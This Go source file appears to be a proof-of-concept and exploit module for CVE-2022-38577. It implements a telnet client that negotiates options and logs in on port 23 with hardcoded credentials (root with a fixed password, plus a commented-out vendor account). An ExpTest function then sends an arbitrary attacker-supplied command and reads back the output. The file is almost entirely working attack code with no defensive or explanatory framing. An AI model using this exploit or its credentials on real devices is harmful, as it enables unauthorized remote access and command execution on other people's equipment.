package cve_2022_38577

import (
	"log"
	"net"
	"strings"
	"time"
)

const (
	//经过测试，linux下，延时需要大于100ms
	TIME_DELAY_AFTER_WRITE = 500 //500ms
)

type TelnetClient struct {
	IP               string
	Port             string
	IsAuthentication bool
	UserName         string
	Password         string
}

func (t *TelnetClient) getConn(timeout int) (net.Conn, error) {
	raddr := t.IP + ":" + t.Port
	return net.DialTimeout("tcp", raddr, time.Duration(timeout)*time.Second)
}

func (t *TelnetClient) telnetHandshake(conn net.Conn) bool {
	var buf [4096]byte
	n, err := conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r: ", string(buf[0:n]))
	log.Println(buf[0:n])

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	buf[1] = 252
	buf[4] = 252
	buf[7] = 252
	buf[10] = 252
	log.Println("w1: ", string(buf[0:n]))
	n, err = conn.Write(buf[0:n])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)
	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("pkg: model, func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r1: ", string(buf[0:n]))
	log.Println(buf[0:n])

	buf[1] = 252
	buf[4] = 251
	buf[7] = 252
	buf[10] = 254
	buf[13] = 252
	log.Println("w2: ", string(buf[0:n]))
	n, err = conn.Write(buf[0:n])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	r2 := string(buf[0:n])
	log.Println("r2: ", r2)
	log.Println(buf[0:n])

	if strings.Contains(r2, "login:") {
		goto talk
	} else {
		buf[1] = 252
		buf[4] = 252
		log.Println("w3: ", string(buf[0:n]))
		n, err = conn.Write(buf[0:n])
		if nil != err {
			log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
			return false
		}

		time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

		n, err = conn.Read(buf[0:])
		if nil != err {
			log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
			return false
		}
		log.Println("r3: ", string(buf[0:n]))
		log.Println(buf[0:n])
		goto talk
	}

talk:
	n, err = conn.Write([]byte(t.UserName + "\n"))
	log.Println("w5: ", t.UserName)
	if nil != err {
		log.Println("pkg: model, func: telnetHandshake, method: conn.Write, errInfo:", err)
		return false
	}
	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r5: ", string(buf[0:n]))

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Write([]byte(t.Password + "\n"))
	log.Println("w6: ", t.Password)
	if nil != err {
		log.Println("pkg: model, func: telnetHandshake, method: conn.Write, errInfo:", err)
		return false
	}
	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	result := string(buf[0:n])
	log.Println("r6: ", result)

	if strings.Contains(result, "Last login:") {
		return true
	}

	return false
}

func (t *TelnetClient) telnetProtocolHandshake(conn net.Conn) bool {
	var buf [4096]byte
	n, err := conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r: ", string(buf[0:n]))
	log.Println(buf[0:n])

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	buf[1] = 252
	buf[4] = 252
	buf[7] = 252
	buf[10] = 252
	log.Println("w1: ", string(buf[0:n]))
	n, err = conn.Write(buf[0:n])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)
	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("pkg: model, func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r1: ", string(buf[0:n]))
	log.Println(buf[0:n])

	buf[1] = 252
	buf[4] = 251
	buf[7] = 252
	buf[10] = 254
	buf[13] = 252
	log.Println("w2: ", string(buf[0:n]))
	n, err = conn.Write(buf[0:n])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r2: ", string(buf[0:n]))
	log.Println(buf[0:n])

	buf[1] = 252
	buf[4] = 252
	log.Println("w3: ", string(buf[0:n]))
	n, err = conn.Write(buf[0:n])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r3: ", string(buf[0:n]))
	log.Println(buf[0:n])

	if false == t.IsAuthentication {
		return true
	}

	n, err = conn.Write([]byte(t.UserName + "\n"))
	log.Println("w4: ", t.UserName)
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}
	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r4: ", string(buf[0:n]))

	n, err = conn.Write([]byte(t.UserName + "\n"))
	log.Println("w5: ", t.UserName)
	if nil != err {
		log.Println("pkg: model, func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}
	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	log.Println("r5: ", string(buf[0:n]))

	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Write([]byte(t.Password + "\n"))
	log.Println("w6: ", t.Password)
	if nil != err {
		log.Println("pkg: model, func: telnetProtocolHandshake, method: conn.Write, errInfo:", err)
		return false
	}
	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	n, err = conn.Read(buf[0:])
	if nil != err {
		log.Println("func: telnetProtocolHandshake, method: conn.Read, errInfo:", err)
		return false
	}
	result := string(buf[0:n])
	log.Println("r6: ", result)

	if strings.Contains(result, "Last login:") {
		return true
	}

	return false
}

func PocTest(ip string) {
	c := &TelnetClient{
		IP:               ip,
		Port:             "23",
		IsAuthentication: true,
		//UserName:         "Alphanetworks",
		//Password:         "wrgnd21_dlob.hans_dir845",
		UserName: "root",
		Password: "Bmh@2015",
	}

	conn, err := c.getConn(20)
	if err != nil {
		log.Fatalf("get conn failed, errInfo:%v", err)
	}
	defer conn.Close()

	//if c.telnetProtocolHandshake(conn) {
	if c.telnetHandshake(conn) {
		log.Println("poc verify successful")
	}
}

func ExpTest(ip string, ss map[string]string) {
	var buf [4096]byte
	c := &TelnetClient{
		IP:               ip,
		Port:             "23",
		IsAuthentication: true,
		//UserName:         "Alphanetworks",
		//Password:         "wrgnd21_dlob.hans_dir845",
		UserName: "root",
		Password: "Bmh@2015",
	}

	conn, err := c.getConn(20)
	if err != nil {
		log.Fatalf("get conn failed, errInfo:%v", err)
	}
	defer conn.Close()

	if c.telnetHandshake(conn) {
		log.Println("poc verify successful")
	}
	time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

	if ss["AttackType"] == "cmd" {
		_, err = conn.Write([]byte(ss["cmd"] + "\n"))
		log.Println("send: ", ss["cmd"])
		if nil != err {
			log.Println("func: ExpTest, method: conn.Write, errInfo:", err)
		}

		time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

		n, err := conn.Read(buf[0:])
		if nil != err {
			log.Println("func: ExpTest, method: conn.Read, errInfo:", err)
		}
		log.Println("receive: ", string(buf[0:n]))

		time.Sleep(time.Millisecond * TIME_DELAY_AFTER_WRITE)

		n, err = conn.Read(buf[0:])
		if nil != err {
			log.Println("func: ExpTest, method: conn.Read, errInfo:", err)
		}
		result := string(buf[0:n])
		log.Println("receive: ", result)

		log.Println("finish...")
	}
}
